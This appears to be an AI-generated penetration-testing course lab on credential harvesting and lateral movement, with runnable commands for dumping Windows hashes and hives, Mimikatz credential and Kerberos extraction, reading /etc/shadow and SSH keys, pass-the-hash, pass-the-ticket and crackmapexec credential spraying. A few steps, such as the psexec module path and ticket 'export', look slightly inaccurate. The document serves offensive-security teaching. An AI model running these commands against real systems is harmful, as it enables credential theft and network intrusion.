# **Lab 9.4 — Credential Harvesting & Lateral Movement**

### _Week 09 — Internal Network Exploitation & Lateral Movement_

**Estimated Time:** 120–180 minutes  
**Difficulty:** Advanced  
**Tools:** Meterpreter, Mimikatz, Metasploit Framework, proxychains, nmap, BloodHound (optional), internal Windows/Linux hosts

---

## **1. Purpose of This Lab**

This lab teaches you how to **extract credentials from compromised systems** and use them for **lateral movement** deeper into the internal network.

By the end of this lab, you will be able to:

- Dump Windows credentials (SAM, SYSTEM, SECURITY hives)
- Use Mimikatz to extract plaintext passwords, hashes, and Kerberos tickets
- Dump Linux credentials (shadow file, SSH keys)
- Reuse credentials for lateral movement (pass‑the‑hash, pass‑the‑ticket, SSH pivoting)
- Identify privilege escalation paths
- Build a chained compromise path across multiple internal hosts

This lab is the core of **post‑exploitation** and **internal network dominance**.

---

## **2. Pre‑Lab Requirements**

You must have:

- Completed **Lab 9.1 (Pivoting)**
- Completed **Lab 9.2 (Internal Service Exploitation)**
- At least one internal Windows or Linux host compromised
- A working Meterpreter session
- SOCKS proxy + proxychains configured

Example topology:

```
Kali → (Pivot Host) → Internal Host A → Internal Host B
```

---

## **3. Lab Tasks**

---

# **Task 1 — Identify Privilege Level on the Compromised Host**

### **Objective**

Determine whether you have enough privileges to dump credentials.

### **Steps**

From Meterpreter:

```
getuid
sysinfo
```

Check if you are:

- **SYSTEM** on Windows
- **root** on Linux

If not, attempt privilege escalation:

```
getsystem
```

### **Deliverable**

A note confirming your privilege level.

---

# **Task 2 — Dump Windows Credentials (SAM, SYSTEM, SECURITY)**

### **Objective**

Extract password hashes from Windows.

### **Steps**

From Meterpreter:

```
hashdump
```

If that fails:

```
run post/windows/gather/hashdump
```

Or dump registry hives:

```
reg save HKLM\SAM sam.save
reg save HKLM\SYSTEM system.save
reg save HKLM\SECURITY security.save
```

### **What to Observe**

- NTLM hashes
- Local Administrator password
- Reused passwords across hosts

### **Deliverable**

A list of extracted Windows hashes.

---

# **Task 3 — Run Mimikatz to Extract Plaintext Passwords**

### **Objective**

Use Mimikatz to extract credentials from memory.

### **Steps**

Load Mimikatz:

```
load kiwi
```

Dump credentials:

```
creds_all
```

Dump Kerberos tickets:

```
kerberos_ticket_list
```

### **What to Observe**

- Plaintext passwords
- NTLM hashes
- Kerberos TGT/TGS tickets
- DPAPI secrets

### **Deliverable**

A list of plaintext passwords and Kerberos tickets.

---

# **Task 4 — Dump Linux Credentials**

### **Objective**

Extract Linux password hashes and SSH keys.

### **Steps**

From Meterpreter:

```
shell
cat /etc/shadow
```

Search for SSH keys:

```
find / -name "id_rsa" 2>/dev/null
```

### **What to Observe**

- Password hashes
- SSH private keys
- Reused credentials

### **Deliverable**

A list of Linux credentials and SSH keys.

---

# **Task 5 — Perform Pass‑the‑Hash (Windows)**

### **Objective**

Use NTLM hashes to authenticate without knowing the password.

### **Steps**

In Metasploit:

```
use auxiliary/admin/smb/psexec
set RHOSTS 10.10.10.20
set SMBUser Administrator
set SMBPass <NTLM hash>
run
```

### **What to Observe**

- Successful authentication
- New Meterpreter session
- Lateral movement without plaintext password

### **Deliverable**

A note confirming pass‑the‑hash success.

---

# **Task 6 — Perform Pass‑the‑Ticket (Kerberos)**

### **Objective**

Use Kerberos tickets extracted via Mimikatz.

### **Steps**

Export tickets:

```
kerberos_ticket_list
kerberos_ticket_purge
kerberos_ticket_use <ticket.kirbi>
```

Then attempt SMB or WinRM access.

### **What to Observe**

- Authentication succeeds without password or hash
- You impersonate the ticket owner

### **Deliverable**

A note confirming pass‑the‑ticket success.

---

# **Task 7 — Use SSH Keys for Lateral Movement (Linux)**

### **Objective**

Use stolen SSH keys to access internal Linux hosts.

### **Steps**

Save the key:

```
chmod 600 id_rsa
proxychains ssh -i id_rsa user@10.10.20.5
```

### **What to Observe**

- Direct access to internal Linux hosts
- No password required
- Potential for privilege escalation

### **Deliverable**

A note confirming SSH lateral movement.

---

# **Task 8 — Use proxychains for Credential Testing**

### **Objective**

Test credentials across internal hosts.

### **Examples**

### SMB:

```
proxychains crackmapexec smb 10.10.10.0/24 -u admin -p password123
```

### SSH:

```
proxychains crackmapexec ssh 10.10.20.0/24 -u root -p toor
```

### RDP:

```
proxychains xfreerdp /u:admin /p:password123 /v:10.10.10.25
```

### **What to Observe**

- Password reuse
- Weak internal credentials
- New lateral movement paths

### **Deliverable**

A list of internal hosts accessible with harvested credentials.

---

# **Task 9 — Build a Credential Graph (Optional but Recommended)**

### **Objective**

Visualize credential reuse and escalation paths.

### **Tools**

- BloodHound
- Neo4j
- Custom Obsidian graph

### **What to Observe**

- Which accounts unlock which hosts
- Privilege escalation chains
- Domain dominance paths

### **Deliverable**

A credential graph showing lateral movement paths.

---

# **Task 10 — Build a Full Credential‑Based Lateral Movement Chain**

### **Objective**

Document your entire compromise path.

### **Include:**

- Initial compromise
- Credentials harvested
- Hosts accessed
- New credentials harvested
- New pivots
- Final level of access achieved

### **Deliverable**

A complete lateral movement chain in your Obsidian vault.

---

## **4. Completion Criteria**

You have completed Lab 9.4 when you can:

- Dump Windows and Linux credentials
- Use Mimikatz for plaintext passwords and Kerberos tickets
- Perform pass‑the‑hash and pass‑the‑ticket
- Use SSH keys for lateral movement
- Test credentials across internal hosts
- Build a credential graph
- Document a full credential‑based lateral movement chain

---

## **5. Next Steps**

When you’re ready, say:

**“Next lab.”**

And I’ll generate **Lab 9.5 — Privilege Escalation on Internal Hosts** in the same course style.